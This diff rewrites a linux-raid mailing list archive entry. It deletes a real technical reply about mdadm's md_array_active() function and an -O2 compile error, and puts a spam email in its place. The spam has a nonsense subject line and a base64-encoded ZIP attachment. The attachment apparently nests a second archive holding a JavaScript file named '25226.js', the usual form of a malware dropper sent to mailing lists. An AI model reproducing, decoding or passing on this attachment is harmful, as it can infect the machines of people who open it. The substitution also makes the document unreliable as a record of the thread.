@@ -1,124 +1,55 @@
-From: Jes Sorensen <jes.sorensen@gmail.com>
-Subject: Re: GET_ARRAY_INFO assumptions?
-Date: Fri, 21 Apr 2017 12:08:23 -0400
-Message-ID: <187cfe44-b506-7bbe-1ad4-84b4057f1b0d@gmail.com>
-References: <ab07d303-85fb-e912-e4fa-9ee66a1277cc@gmail.com>
- <20170413203742.wg6mrnzedw7ew5ky@kernel.org>
- <0c3633e4-df8c-c59a-17d4-917495931ba1@gmail.com>
- <c0a29266-fdf4-2f07-aabd-6aa1f55d7d46@gmail.com>
- <87k26itx2v.fsf@notabene.neil.brown.name>
- <59ca76c6-1f1f-4d9c-4eb9-d468131e0d55@gmail.com>
- <20170421140634.GA3073@proton.igk.intel.com>
+From: <xa0ajutor@colectiv.info>
+Subject: 15772 linux-raid
+Date: Sat, 22 Apr 2017 04:24:38 -0000
+Message-ID: <149283507827.20066.10571165413706964701@surnet.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8; format=flowed
-Content-Transfer-Encoding: 8bit
+Content-Type: application/zip; name="820.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-raid-owner@vger.kernel.org>
-In-Reply-To: <20170421140634.GA3073@proton.igk.intel.com>
+Content-Disposition: attachment
 Sender: linux-raid-owner@vger.kernel.org
-To: Tomasz Majchrzak <tomasz.majchrzak@intel.com>
-Cc: NeilBrown <neilb@suse.com>, Shaohua Li <shli@kernel.org>, linux-raid@vger.kernel.org
+To: linux-raid@vger.kernel.org
 List-Id: linux-raid.ids
 
-On 04/21/2017 10:06 AM, Tomasz Majchrzak wrote:
-> On Thu, Apr 20, 2017 at 12:05:54PM -0400, Jes Sorensen wrote:
->> On 04/17/2017 07:48 PM, NeilBrown wrote:
->>> On Fri, Apr 14 2017, Jes Sorensen wrote:
->>>> Looking some more at this, it may be simpler than I thought. How about
->>>> this approach (only compile tested):
->>>>
->>>> int md_array_active(int fd)
->>>> {
->>>> 	struct mdinfo *sra;
->>>> 	struct mdu_array_info_s array;
->>>> 	int ret;
->>>>
->>>> 	sra = sysfs_read(fd, NULL, GET_VERSION | GET_DISKS);
->>>> 	if (sra) {
->>>> 		if (!sra->array.raid_disks &&
->>>> 		    !(sra->array.major_version == -1 &&
->>>> 		      sra->array.minor_version == -2))
->>>> 			ret = -ENODEV;
->>>> 		else
->>>> 			ret = 0;
->>>>
->>>> 		free(sra);
->>>> 	} else {
->>>> 		ret = ioctl(fd, GET_ARRAY_INFO, &array);
->>>> 	}
->>>>
->>>> 	return !ret;
->>>> }
->>>>
->>>> Note 'major = -1 && minor = -2' is sysfs_read's way of saying 'external'.
->>>>
->>>> This pretty much mimics what the kernel does in the ioctl handler for
->>>> GET_ARRAY_INFO:
->>>>
->>>> 	case GET_ARRAY_INFO:
->>>> 		if (!mddev->raid_disks && !mddev->external)
->>>> 			err = -ENODEV;
->>>> 		else
->>>> 			err = get_array_info(mddev, argp);
->>>> 		goto out;
->>>>
->>>> What do you think?
->>>
->>> I think that it accurately mimics what the current code does.
->>> I'm not sure that is what we really want.
->>> For testing in Incremental.c if an array is "active" we really
->>> should be testing more than "raid_disks != 0".
->>> We should be testing, as Shaohua suggested, if
->>> array_state != 'clear' or 'inactive'.
->>> You cannot get that info through the ioctl interface, so I suppose
->>> I decided the current test was 'close enough'.
->>> If we are going to stop supported kernels that don't have (e.g.)
->>> array_state, then we should really fo the right thing and test
->>> array_state.
->>
->> I think I got it right this time and pushed it into git. It made
->> things a lot prettier too IMHO :)
->>
->> In the process I also changed the behavior of
->> sysfs_read(GET_ARRAY_STATE) as I really didn't like how it was
->> copying in the string rather than parsing it.
->>
->> I am traveling at the moment and don't yet have my new raid test box
->> setup back at the office, so my testing is limited. If I broke
->> something badly, feel free to throw rotten tomatoes at me.
->>
->
-> Hi Jes,
->
-> Compilation with "-O2" flag fails:
->
-> CXFLAGS=-O2 make
->
-> cc -Wall -Werror -Wstrict-prototypes -Wextra -Wno-unused-parameter -O2
-> -DSendmail=\""/usr/sbin/sendmail -t"\" -DCONFFILE=\"/etc/mdadm.conf\"
-> -DCONFFILE2=\"/etc/mdadm/mdadm.conf\" -DMAP_DIR=\"/run/mdadm\"
-> -DMAP_FILE=\"map\" -DMDMON_DIR=\"/run/mdadm\"
-> -DFAILED_SLOTS_DIR=\"/run/mdadm/failed-slots\" -DNO_COROSYNC -DNO_DLM
-> -DVERSION=\"4.0-85-g4435675\" -DVERS_DATE="\"2017-04-20\"" -DUSE_PTHREADS
-> -DBINDIR=\"/sbin\"  -c -o Query.o Query.c
->
-> Query.c: In function ‘Query’:
-> Query.c:92:9: error: ‘level’ may be used uninitialized in this function
-> [-Werror=maybe-uninitialized]
->    printf("%s: %s %s %d devices, %d spare%s. Use mdadm --detail for more
->    detail.\n",
->             ^
-> Query.c:92:9: error: ‘spare_disks’ may be used uninitialized in
-> this function [-Werror=maybe-uninitialized]
-> Query.c:92:9: error: ‘raid_disks’ may be used uninitialized in
-> this function [-Werror=maybe-uninitialized]
-> cc1: all warnings being treated as errors
-> make: *** [Query.o] Error 1
-
-Fixed!
-
-I do take patches ;)
-
-Cheers,
-Jes
-
-
+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
+u9IBUEsFBgAAAAABAAEAWwAAAMkIAAAAAA==
